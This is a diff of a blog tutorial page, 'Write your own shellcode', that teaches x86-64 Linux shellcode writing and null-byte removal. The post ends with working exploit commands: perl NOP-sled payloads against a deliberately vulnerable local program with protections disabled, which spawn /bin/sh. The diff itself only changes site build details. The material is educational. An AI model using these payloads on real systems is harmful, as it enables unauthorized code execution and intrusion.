@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/write-your-own-shellcode/"><!-- Primary Meta Tags --><title>Write your own shellcode</title><meta name="title" content="Write your own shellcode"><meta name="description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="og:title" content="Write your own shellcode"><meta property="og:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="og:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="twitter:title" content="Write your own shellcode"><meta property="twitter:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.IGnllL6P.css">
-<link rel="stylesheet" href="/_astro/_slug_.DgHCkA33.css">
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v5.12.7"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/write-your-own-shellcode/"><!-- Primary Meta Tags --><title>Write your own shellcode</title><meta name="title" content="Write your own shellcode"><meta name="description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="og:title" content="Write your own shellcode"><meta property="og:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="og:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/write-your-own-shellcode/"><meta property="twitter:title" content="Write your own shellcode"><meta property="twitter:description" content="Ever dreamed about being a hacker and writing your own exploits? Learn the art of crafting shellcodes and uncover their secrets."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BlhpPIz9.css">
+<link rel="stylesheet" href="/_astro/_slug_.JRAvWsf2.css">
 <style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
-</style><script type="module" src="/_astro/hoisted.DNq6m-fi.js"></script></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
+</style></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
 DO
-<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav>  </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/write-shellcode.BPuIU2Up_Z1GWFWX.webp" class="rounded-xl shadow-ba" alt="" width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2024-10-19T00:00:00.000Z"> Oct 19, 2024 </time> </div> <h1 class="font-[Iceland]"> Write your own shellcode </h1> <hr> </div>  <ul>
+<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const n=document.getElementById("mobile-menu-button"),e=document.getElementById("menu-path");!n||!e||n.addEventListener("click",()=>{const t=document.getElementById("mobile-menu");t&&(t.classList.contains("max-h-0")?(t.classList.remove("max-h-0","opacity-0"),t.classList.add("max-h-96","opacity-100"),e.setAttribute("d","M6 18L18 6M6 6l12 12")):(t.classList.remove("max-h-96","opacity-100"),t.classList.add("max-h-0","opacity-0"),e.setAttribute("d","M4 6h16M4 12h16m-7 6h7")))})});</script> </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/write-shellcode.BPuIU2Up_yWw0v.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1024" height="1024" class="rounded-xl shadow-ba"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2024-10-19T00:00:00.000Z"> Oct 19, 2024 </time> </div> <h1 class="font-[Iceland]"> Write your own shellcode </h1> <hr> </div>  <ul>
 <li><a href="#whats-a-shellcode">What’s a shellcode?</a></li>
 <li><a href="#building-a-shellcode">Building a shellcode</a>
 <ul>
@@ -53,8 +53,7 @@ my 64-bit Linux machine has the file
 <span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_write</span><span style="color:#BD93F9"> 1</span></span>
 <span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_open</span><span style="color:#BD93F9"> 2</span></span>
 <span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_close</span><span style="color:#BD93F9"> 3</span></span>
-<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_stat</span><span style="color:#BD93F9"> 4</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> __NR_stat</span><span style="color:#BD93F9"> 4</span></span></code></pre>
 <p>Alternatively, you can search for that information on the Internet, for
 example,
 <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> or
@@ -81,15 +80,13 @@ example,
 <span class="line"><span style="color:#6272A4">; exit</span></span>
 <span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span><span style="color:#6272A4"> ; Specify exit syscall</span></span>
 <span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rbx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0</span><span style="color:#6272A4"> ; Exit with success</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span><span style="color:#6272A4"> ; Execute the system call</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#FF79C6">syscall</span><span style="color:#6272A4"> ; Execute the system call</span></span></code></pre>
 <p>The program is simple. We define the target architecture bits, create a
 static string, and print it into stdout. Assembling, linking, and
 executing the binary is also very simple.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#BD93F9"> -f</span><span style="color:#F1FA8C"> elf64</span><span style="color:#F1FA8C"> helloworld.asm</span></span>
 <span class="line"><span style="color:#50FA7B">ld</span><span style="color:#F1FA8C"> helloworld.o</span></span>
-<span class="line"><span style="color:#50FA7B">./a.out</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#50FA7B">./a.out</span></span></code></pre>
 <p>See how it works and experiment a bit.</p>
 <p>Taking that program as a basis, we will now see the different
 restrictions that we have to build a fully functional shellcode.</p>
@@ -123,8 +120,7 @@ able to retrieve it inside the function.</p>
 <span class="line"><span style="color:#6272A4">; exit</span></span>
 <span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">60</span></span>
 <span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0</span></span>
-<span class="line"><span style="color:#FF79C6">syscall</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#FF79C6">syscall</span></span></code></pre>
 <p>Try it out and experiment with it.</p>
 <p>In some situations that’s the only technique you will need to inject a
 shellcode. However, there are some occasions where this may fall short
@@ -136,9 +132,8 @@ remove the null bytes.</p>
 <p>There are different techniques to remove null bytes. Let’s see our
 starting point.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nasm helloworld.asm</span></span>
-<span class="line"><span>hexdump -C helloword</span></span>
-<span class="line"><span></span></span></code></pre>
-<p><img  src="/_astro/hexdump-t0.C5YlI_yk_4c63G.webp" alt="" width="715" height="115" loading="lazy" decoding="async"></p>
+<span class="line"><span>hexdump -C helloword</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="715" height="115" src="/_astro/hexdump-t0.C5YlI_yk_ZExm6c.webp" ></p>
 <p>Notice how many <code>00</code> are there. These are the null bytes.</p>
 <h3 id="jump-to-the-end-and-back">Jump to the end and back</h3>
 <p><code>call</code> instructions allow for “long” jumps. Using it for “small” jumps
@@ -169,9 +164,8 @@ instruction that will jump back to a function.</p>
 <span class="line"></span>
 <span class="line"><span style="color:#50FA7B">bottom:</span></span>
 <span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/hexdump-t1.BVgF98mI_ZBw0PM.webp" alt="" width="716" height="111" loading="lazy" decoding="async"></p>
+<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="716" height="111" src="/_astro/hexdump-t1.BVgF98mI_2cHtrY.webp" ></p>
 <p>We removed some null bytes.</p>
 <h3 id="use-smaller-registers">Use smaller registers</h3>
 <p>Computers have 16 registers. 64-bit registers are built on top of old
@@ -313,9 +307,8 @@ need to use <code>dec register</code>.</p>
 <span class="line"></span>
 <span class="line"><span style="color:#50FA7B">bottom:</span></span>
 <span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/hexdump-t2.BA2n353f_Z2rEeRj.webp" alt="" width="718" height="89" loading="lazy" decoding="async"></p>
+<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "Hello, world!", </span><span style="color:#BD93F9">0x0a</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="718" height="89" src="/_astro/hexdump-t2.BA2n353f_Z26MAv1.webp" ></p>
 <p>We removed all the null bytes!!! This is it. Shellcodes are just a
 matter of executing system calls and avoiding null bytes. Let’s try it
 out with a hands-on exercise.</p>
@@ -342,8 +335,7 @@ environment variable</a>.</p>
 measures for the vulnerable program.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> getenvaddr.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> getenvaddr</span></span>
 <span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notesearch.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notesearch</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> execstack</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
-<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span></code></pre>
 <p>Now, we have to:</p>
 <ol>
 <li>Assemble the shellcode</li>
@@ -356,9 +348,8 @@ program point of view</li>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#F1FA8C"> helloworld.asm</span></span>
 <span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> helloworld</span><span style="color:#F8F8F2">)</span></span>
 <span class="line"><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/getenvaddr SHELLCODE </span><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/notesearch</span></span>
-<span class="line"><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/notesearch $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/write-stdout-exploit.PrTDxyvw_CWIQn.webp" alt="" width="1336" height="234" loading="lazy" decoding="async"></p>
+<span class="line"><span style="color:#FF79C6">~</span><span style="color:#F8F8F2">/Desktop/notesearch $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1336" height="234" src="/_astro/write-stdout-exploit.PrTDxyvw_1HQrh7.webp" ></p>
 <p>Cool! We managed to take control of the program and print what we wanted
 to the stdout. This is rather dull. Let’s try to get a shell prompt!!!</p>
 <p>What would this look like in C?</p>
@@ -366,8 +357,7 @@ to the stdout. This is rather dull. Let’s try to get a shell prompt!!!</p>
 <span class="line"></span>
 <span class="line"><span style="color:#FF79C6">int</span><span style="color:#50FA7B"> main</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">int</span><span style="color:#FFB86C;font-style:italic"> argc</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">char</span><span style="color:#FF79C6"> *</span><span style="color:#FFB86C;font-style:italic">argv</span><span style="color:#FF79C6">[]</span><span style="color:#F8F8F2">) {</span></span>
 <span class="line"><span style="color:#50FA7B">    system</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/bin/sh</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>You can try it out with <code>gcc shell.c -o shell; chmod +x shell; ./shell</code>.</p>
 <p>If you search on the internet, you will find that
 <a href="https://man7.org/linux/man-pages/man3/system.3.html">system</a> internally
@@ -400,13 +390,11 @@ Just call <code>execve</code> with <code>/bin/sh</code> as the program name.</p>
 <span class="line"></span>
 <span class="line"><span style="color:#50FA7B">bottom:</span></span>
 <span class="line"><span style="color:#FF79C6">call</span><span style="color:#F8F8F2"> above</span></span>
-<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "/bin/sh"</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#FF79C6">db</span><span style="color:#F8F8F2"> "/bin/sh"</span></span></code></pre>
 <p>Let’s try to inject it.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nasm</span><span style="color:#F1FA8C"> shell.asm</span><span style="color:#F8F8F2">; </span><span style="color:#FF79C6">\</span></span>
 <span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> shell</span><span style="color:#F8F8F2">); </span><span style="color:#FF79C6">\</span></span>
 <span class="line"><span style="color:#50FA7B">~/Desktop/getenvaddr</span><span style="color:#F1FA8C"> SHELLCODE</span><span style="color:#F1FA8C"> ~/Desktop/notesearch</span><span style="color:#F8F8F2">; </span><span style="color:#FF79C6">\</span></span>
-<span class="line"><span style="color:#50FA7B">~/Desktop/notesearch</span><span style="color:#F8F8F2"> $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/shell-exploit.y7YkD9m6_28DNPp.webp" alt="" width="1327" height="261" loading="lazy" decoding="async"></p>
+<span class="line"><span style="color:#50FA7B">~/Desktop/notesearch</span><span style="color:#F8F8F2"> $(</span><span style="color:#50FA7B">perl</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">)</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1327" height="261" src="/_astro/shell-exploit.y7YkD9m6_Z1r8Gxr.webp" ></p>
 <p>We got shell access!!!</p>  </div> </article> <footer></footer> </body></html>
